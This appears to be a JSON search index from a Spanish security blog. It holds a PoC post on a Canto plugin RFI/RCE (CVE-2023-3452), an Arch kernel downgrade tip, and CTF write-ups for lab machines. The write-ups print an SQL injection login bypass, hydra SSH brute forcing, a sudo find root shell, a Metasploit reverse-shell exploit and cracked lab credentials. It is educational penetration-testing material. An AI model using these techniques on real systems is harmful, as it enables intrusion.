[{"content":"En este PoC veremos una Inclusi√≥n Remota de Ficheros No Autenticada (RFI) y Ejecuci√≥n Remota de C√≥digo No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.0.5.\nWhat is Canto? Canto es un plugin de c√≥digo abierto, un software de gesti√≥n de activos digitales que organiza archivos y multimedia para empresas.\nProof Of Content Esta vulnerabilidad afecta al par√°metro wp_abspath que se encuentra en la siguiente l√≠nea de includes/lib/download.php:\n*** require_once($_REQUEST[\u0026#39;wp_abspath\u0026#39;] . \u0026#39;/wp-admin/admin.php\u0026#39;); ***\rTambi√©n debe estar habilitado en php.ini el allow_url_include:\nVamos a enviar una petici√≥n GET a un servidor python que he abierto en el puerto 8881:\nPodemos ver que hemos recibido de la petici√≥n GET a nuestro servidor python, podemos ver que la llamada se realiza desde /wp-admin/admin.php , ahora en lugar de querer enviarnos una petici√≥n vamos a intentar ejecutar un comando:\nExploit Repositorio\rScript en python automatizado para el PoC del CVE-2023-3452\nCTF con CVE-2023-3452 He creado una m√°quina con esta vulnerabilidad por si la quere√≠s tocar, la m√°quina est√° en la plataforma HackMyVM:\nhttps://hackmyvm.eu/machines/machine.php?vm=Canto\n","date":"2025-06-15","id":0,"permalink":"/blog/cve-2023-3452-remote-file-inclusion-remote-code-execution-unauthenticated/","summary":"En este PoC veremos una Inclusi√≥n Remota de Ficheros No Autenticada (RFI) y Ejecuci√≥n Remota de C√≥digo No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.","tags":["CVE-2023-3452","RFI","RCE","Unauthenticated"],"title":"CVE-2023-3452 - Remote File Inclusion - Remote Code Execution - Unauthenticated"},{"content":"En algunos casos al actualizar tu Arch Linux puede que veas una actualizaci√≥n del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel. Hay posibilidades de arreglarlo pero lo m√°s f√°cil y factible es volver al kernel anterior donde los drivers funcionaban correctamente.\nPacman cache Para ver la cache de pacman podemos hacer un ls al directorio /var/cache/pacman/pkg y si tenemos suerte y no hemos borrado la cache al actualizar podemos encontrar el paquete del kernel anterior donde funcionaban los drivers NVIDIA:\n‚ùØ ls /var/cache/pacman/pkg/ | grep linux-zen linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig\rEn mi caso donde ha funcionado es en la 6.11.6 por lo que podemos seguir los pasos de la Wiki de Arch:\nhttps://wiki.archlinux.org/title/Downgrading_packages Downgrade Si no podemos encontrar el kernel anterior donde funcionaban los drivers usaremos una herramienta llamada Downgrade.\nComparto el repositorio:\nhttps://github.com/archlinux-downgrade/downgrade Si tenemos yay podremos instalarlo f√°cilmente:\nyay -S downgrade\rSi no tenemos yay podemos instalarlo, os comparto el repositorio donde explica su instalaci√≥n:\nhttps://github.com/Jguer/yay?tab=readme-ov-file#installation Una vez instalado el downgrade pondremos el siguiente comando buscando el kernel que usamos (en mi caso linux-zen):\nsudo downgrade linux-zen\rAhora buscaremos la versi√≥n de kernel que tuvimos antes y le daremos a Enter y empezar√° a instalarse.\nCaution\nRECUERDA: Tendr√°s que desinstalar linux-headers o linux-zen-headers dependiendo de cual est√©s usando e instalarlos tambi√©n con el mismo comando downgrade pero buscando linux-zen-headers.\n","date":"2025-06-15","id":1,"permalink":"/blog/los-drivers-de-nvidia-no-compilan-correctamente-en-arch-linux/","summary":"En algunos casos al actualizar tu Arch Linux puede que veas una actualizaci√≥n del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel.","tags":["Arch Linux","Nvidia"],"title":"Los drivers de NVIDIA no compilan correctamente en Arch Linux"},{"content":"","date":"2023-09-07","id":2,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":3,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"DOCKERLABS"},{"content":"","date":"2023-09-07","id":4,"permalink":"/challenges/hackmyvm/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":5,"permalink":"/writeups/dockerlabs/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":6,"permalink":"/challenges/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":7,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":8,"permalink":"/writeups/thehackerslabs/","summary":"","tags":[],"title":"THEHACKERSLABS"},{"content":"","date":"2023-09-07","id":9,"permalink":"/writeups/vulnhub/","summary":"","tags":[],"title":"VULNHUB"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.44.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:02 CEST Initiating ARP Ping Scan at 13:02 Scanning 192.168.44.130 [1 port] Completed ARP Ping Scan at 13:02, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:02 Scanning 192.168.44.130 [65535 ports] Discovered open port 80/tcp on 192.168.44.130 Discovered open port 22/tcp on 192.168.44.130 Completed SYN Stealth Scan at 13:02, 0.86s elapsed (65535 total ports) Nmap scan report for 192.168.44.130 Host is up, received arp-response (0.000056s latency). Scanned at 2025-07-19 13:02:58 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:6B:B7:3D (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.06 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVale ahora vamos a realizar un segundo escaneo para ver que servicios y versiones corren en ellos:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ nmap -p22,80 -sCV 192.168.44.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:03 CEST Nmap scan report for 192.168.44.130 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 (ECDSA) |_ 256 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: AFN |_http-server-header: nginx/1.24.0 (Ubuntu) MAC Address: 00:0C:29:6B:B7:3D (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds\rBien, vamos a acceder a la aplicaci√≥n web:\nVemos que es una aplicaci√≥n web simple donde no hay gran cosa a simple vista ni a nivel de c√≥digo fuente. Vamos a realizar fuzzing:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.44.130/FUZZ\u0026#34; -e .php,.html,.txt,.js /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.44.130/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .txt .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms] index.php [Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 5ms] login.php [Status: 200, Size: 2543, Words: 743, Lines: 98, Duration: 3ms] admin.php [Status: 200, Size: 359, Words: 22, Lines: 14, Duration: 2ms]\rVemos un login.php y admin.php, vamos al login.php:\nShell as superadministrator Vemos un mensaje que dice P√°gina en desarrollo, no entrar !!!, vamos a probar un SQLi:\ntest\u0026#39;\rVemos que se acontece el error de la consulta y nos muestra el propio error, posiblemente la query que emplee sea como la siguiente:\nSELECT * FROM users WHERE username = \u0026#39;$input_name\u0026#39; AND password = \u0026#39;$input_password\u0026#39;;\rVemos que podr√≠a usar el operador AND lo que significa que ambas condiciones tienen que devolver true, pero\u0026hellip; y si comentamos la parte del AND y a√±adimos un operador OR?\nSi realizamos eso la consulta ser√≠a:\nPayload\rConsulta\rtest\u0026#39; or 1=1-- -\rSELECT * FROM users WHERE username = \u0026#39;test\u0026#39; or 1=1-- -\u0026#39; AND password = \u0026#39;$input_password\u0026#39;;\rEsto ocasionar√° una modificaci√≥n de l√≥gica de la consulta devolviendo true ya que si el usuario no es v√°lido devolver√° false pero como 1=1 siempre devolver√° true y el operador OR devuelve la consulta true si al menos una de ambas condiciones lo devuelve (como es el caso).\nAs√≠ que como resultado ser√° un bypass de la autentificaci√≥n:\nBien leyendo un poco lo que hay en la web vi una redirecci√≥n a un archivo llamado todo-list.php:\nVemos el siguiente mensaje:\nHe creado una nueva p√°gina para poder leer los ficheros internos del servidor, cada d√≠a soy un mejor programador. Adem√°s he codificado su nombre en base64, as√≠ nadie podr√° dar con ella (lee_archivos). Comenta que ha codificado en base64 el nombre del archivo, entre parentesis nos dan el nombre leer_archivos vamos a codificarlo y probar:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ echo \u0026#34;lee_archivos\u0026#34; | base64 bGVlX2FyY2hpdm9zCg==\rVamos a probar a apuntar a un archivo llamado bGVlX2FyY2hpdm9zCg==.php:\nBien!! Vemos que nos indica que podemos buscar y leer cualquier archivo de la m√°quina, vamos a probar el /etc/passwd:\nVemos que funciona, vamos a intentar ver si podemos leer el id_rsa del usuario superadministrator:\nNo podemos, vamos intentar hacerle fuerza bruta por el SSH a superadministrator. Para ello emplearemos hydra:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.44.130 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-19 13:34:02 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://192.168.44.130:22/ [22][ssh] host: 192.168.44.130 login: superadministrator password: princesa 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-19 13:34:29\rBien!! Tenemos sus credenciales, vamos a iniciar sesi√≥n por SSH:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ ssh superadministrator@192.168.44.130 superadministrator@192.168.44.130\u0026#39;s password: Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-51-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat Jul 19 11:35:55 AM UTC 2025 System load: 0.02 Processes: 218 Usage of /: 14.6% of 49.21GB Users logged in: 0 Memory usage: 39% IPv4 address for ens33: 192.168.44.130 Swap usage: 0% * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge Expanded Security Maintenance for Applications is not enabled. 1 update can be applied immediately. To see these additional updates run: apt list --upgradable Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Sat Jul 19 10:58:52 2025 from 192.168.44.128 superadministrator@thehackerslabs-bocatacalamares:~$\rShell as root Si hacemos un ls podremos ver el siguiente archivo:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ ls flag.txt recordatorio.txt\rVamos a leer recordatorio.txt:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aqu√≠ apuntada para recordarlo mas adelante.\rVamos a hacer un sudo -l para ver si tenemos alg√∫n tipo de permiso sudoers:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ sudo -l Matching Defaults entries for superadministrator on thehackerslabs-bocatacalamares: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User superadministrator may run the following commands on thehackerslabs-bocatacalamares: (ALL) NOPASSWD: /usr/bin/find\rVamos a seguir lo indicado en GTFObins:\nsuperadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/bash \\; -quit root@thehackerslabs-bocatacalamares:/home/superadministrator# whoami root\rroot! ;)\n","date":"2025-07-19","id":10,"permalink":"/writeups/thehackerslabs/bocatacalamares/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/BocataCalamares/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.44.130 Starting Nmap 7.","tags":[],"title":"BocataCalamares"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/nmap] ‚îî‚îÄ$ nmap -p- --open -sS -n -Pn -vvv --min-rate=5000 192.168.44.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 16:19 CEST Initiating ARP Ping Scan at 16:19 Scanning 192.168.44.131 [1 port] Completed ARP Ping Scan at 16:19, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 16:19 Scanning 192.168.44.131 [65535 ports] Discovered open port 80/tcp on 192.168.44.131 Discovered open port 22/tcp on 192.168.44.131 Completed SYN Stealth Scan at 16:19, 0.74s elapsed (65535 total ports) Nmap scan report for 192.168.44.131 Host is up, received arp-response (0.00044s latency). Scanned at 2025-07-19 16:19:10 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:0F:FD:9F (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVamos a realizar un segundo escaneo para determinar el servicio y versi√≥n que corre en cada puerto:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/nmap] ‚îî‚îÄ$ nmap -p22,80 -sCV 192.168.44.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 16:19 CEST Nmap scan report for jaulacon2025.thl (192.168.44.131) Host is up (0.00014s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA) |_ 256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519) 80/tcp open http Apache httpd 2.4.62 ((Debian)) |_http-title: Bienvenido a Bludit | BLUDIT |_http-generator: Bludit |_http-server-header: Apache/2.4.62 (Debian) MAC Address: 00:0C:29:0F:FD:9F (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds\rBien, vamos a ver la aplicaci√≥n web:\nVemos que no carga correctamente\u0026hellip; seguramente porque haya un dominio configurado. Viendo el c√≥digo fuente web me encuentro lo siguiente:\nVamos a a√±adir jaulacon2025.thl en nuestro /etc/hosts:\n127.0.0.1\tlocalhost 127.0.1.1\tkali # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 192.168.44.131 jaulacon2025.thl\rAhora si recargamos la web la veremos normal:\nBien, si nos fijamos podemos ver varias veces el nombre Bludit. Si buscamos lo que es nos encontraremos lo siguiente:\nVemos que es un CMS, vamos a realizar fuzzing con ffuf para ver si encontramos la versi√≥n especifica del CMS:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://jaulacon2025.thl/FUZZ\u0026#34; -e .php,.html,.txt,.js /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://jaulacon2025.thl/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .txt .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ 0 [Status: 200, Size: 4541, Words: 271, Lines: 137, Duration: 200ms] admin [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 150ms] install.php [Status: 200, Size: 30, Words: 5, Lines: 1, Duration: 6ms] robots.txt [Status: 200, Size: 22, Words: 3, Lines: 2, Duration: 55ms] LICENSE [Status: 200, Size: 1083, Words: 155, Lines: 22, Duration: 0ms]\rVamos a ver install.php:\nNo vemos ninguna informaci√≥n relevante, vamos a ver en robots.txt:\nNada\u0026hellip; Decid√≠ leer la propia documentaci√≥n de Bludit:\nhttps://docs.bludit.com/en/ Vamos a acceder a ver que hay y si podemos sacar la versi√≥n del CMS:\nVemos la carpeta version vamos a entrar:\nAccediendo a metadata.json encontramos lo siguiente:\n{ \u0026#34;author\u0026#34;: \u0026#34;Bludit\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;website\u0026#34;: \u0026#34;https://plugins.bludit.com\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;3.9.2\u0026#34;, \u0026#34;releaseDate\u0026#34;: \u0026#34;2019-06-21\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;compatible\u0026#34;: \u0026#34;3.9.2\u0026#34;, \u0026#34;notes\u0026#34;: \u0026#34;\u0026#34; }\rEncontramos la versi√≥n 3.9,2, vamos a buscar la √∫ltima versi√≥n que hay:\nVemos que esta desactualizado el CMS, vamos a buscar alg√∫n posible exploit. Buscando encontr√© el siguiente CVE:\nhttps://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2019-16113 Pero requerimos de credenciales\u0026hellip; Buscando encontr√© lo siguiente:\nBludit 3.9.2 - Auth Bruteforce Bypass\rShell as www-data Vamos a usarlo para hacer fuerza bruta:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/exploits] ‚îî‚îÄ$ python3 Bludit-Auth-Bypass.py -l http://jaulacon2025.thl/admin/ -u /usr/share/wordlists/rockyou.txt -p /usr/share/wordlists/rockyou.txt\rNota\nAl ejecutar por primera vez el Bludit-Auth-Bypass.py os pedir√° instalar unos requerimientos, os recomiendo hacerlo en un entorno virtual (venv).\nDespu√©s de un rato no encontr√≥ nada\u0026hellip; Recordando en la web estaba el siguiente texto sin m√°s:\nVamos a probar a a√±adir este usuario en una wordlist y probar nuevamente el script de fuerza bruta:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/exploits] ‚îî‚îÄ$ python3 Bludit-Auth-Bypass.py -l http://jaulacon2025.thl/admin/ -u users -p /usr/share/wordlists/rockyou.txt [..] [*] ¬°√âXITO! [+] Usar credencial -\u0026gt; Jaulacon2025:cassandra\rEncontr√≥ las credenciales correctas!! Vamos a probarlas en el login:\nBien!! Ahora podremos explotar el CVE-2019-16113 encontrado anteriormente, para ello lo explotaremos con metasploit. Vamos a iniciarlo y seleccionar el exploit:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/exploits] ‚îî‚îÄ$ msfconsole Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again _ _ / \\ /\\ __ _ __ /_/ __ | |\\ / | _____ \\ \\ ___ _____ | | / \\ _ \\ \\ | | \\/| | | ___\\ |- -| /\\ / __\\ | -__/ | || | || | |- -| |_| | | | _|__ | |_ / -\\ __\\ \\ | | | | \\__/| | | |_ |/ |____/ \\___\\/ /\\ \\\\___/ \\/ \\__| |_\\ \\___\\ =[ metasploit v6.4.69-dev ] + -- --=[ 2529 exploits - 1302 auxiliary - 432 post ] + -- --=[ 1672 payloads - 49 encoders - 13 nops ] + -- --=[ 9 evasion ] Metasploit Documentation: https://docs.metasploit.com/ msf6 \u0026gt; search bludit Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/bludit_upload_images_exec 2019-09-07 excellent Yes Bludit Directory Traversal Image File Upload Vulnerability Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec msf6 \u0026gt; use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt;\rAhora pondremos show options para ver las opciones que solicita para explotar el exploit:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; show options Module options (exploit/linux/http/bludit_upload_images_exec): Name Current Setting Required Description ---- --------------- -------- ----------- BLUDITPASS yes The password for Bludit BLUDITUSER yes The username for Bludit Proxies no A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path for Bludit VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.44.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Bludit v3.9.2 View the full module info with the info, or info -d command.\rVamos a ir poniendo los datos respectos solicitados:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set BLUDITPASS cassandra BLUDITPASS =\u0026gt; cassandra msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set BLUDITUSER Jaulacon2025 BLUDITUSER =\u0026gt; Jaulacon2025 msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set RHOST jaulacon2025.thl RHOST =\u0026gt; jaulacon2025.thl\rAhora pondremos run y veremos si funciona:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.44.128:4444 [+] Logged in as: Jaulacon2025 [*] Retrieving UUID... [*] Uploading AigqPgXPSs.png... [*] Uploading .htaccess... [*] Executing AigqPgXPSs.png... [*] Sending stage (40004 bytes) to 192.168.44.131 [+] Deleted .htaccess [*] Meterpreter session 1 opened (192.168.44.128:4444 -\u0026gt; 192.168.44.131:40574) at 2025-07-19 17:37:38 +0200\rAhora pondremos shell para tener ya acceso a la m√°quina:\nmeterpreter \u0026gt; shell Process 3135 created. Channel 0 created. whoami www-data\rShell as JaulaCon2025 Leyendo la documentaci√≥n de Bludit encontr√© lo siguiente:\nhttps://docs.bludit.com/en/developers/folder-structure En las primeras lineas comenta lo siguiente:\n/bl-content/ \u0026lt;-- Databases and uploaded images\rVemos que en esa carpeta contiene el tema de las bases de datos, vamos a verla:\nwww-data@JaulaCon2025:/var/www/html/bl-content/databases$ ls ls categories.php plugins site.php tags.php pages.php security.php syslog.php users.php www-data@JaulaCon2025:/var/www/html/bl-content/databases$\rVemos un users.php vamos a leerlo:\n[..] \u0026#34;JaulaCon2025\u0026#34;: { \u0026#34;firstName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nickname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;author\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;551211bcd6ef18e32742a73fcb85430b\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;jejej\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2025-03-25 19:43:25\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;d1ed37a30b769e2e48123c3efaa1e357\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mastodon\u0026#34;: \u0026#34;\u0026#34; } }\rTenemos en MD5 la contrase√±a del usuario JaulaCon2025. Para confirmar vamos a leer el /etc/passwd para ver si existe en el sistema:\nwww-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin debian:x:1000:1000:debian,,,:/home/debian:/bin/bash mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false JaulaCon2025:x:1001:1001::/home/JaulaCon2025:/bin/bash\rExiste, vamos a usar CrackStation para intentar crackear la contrase√±a:\nBien!! Vamos a probar a iniciar por SSH:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/exploits] ‚îî‚îÄ$ ssh JaulaCon2025@192.168.44.131 JaulaCon2025@192.168.44.131\u0026#39;s password: Linux JaulaCon2025 6.1.0-26-amd64 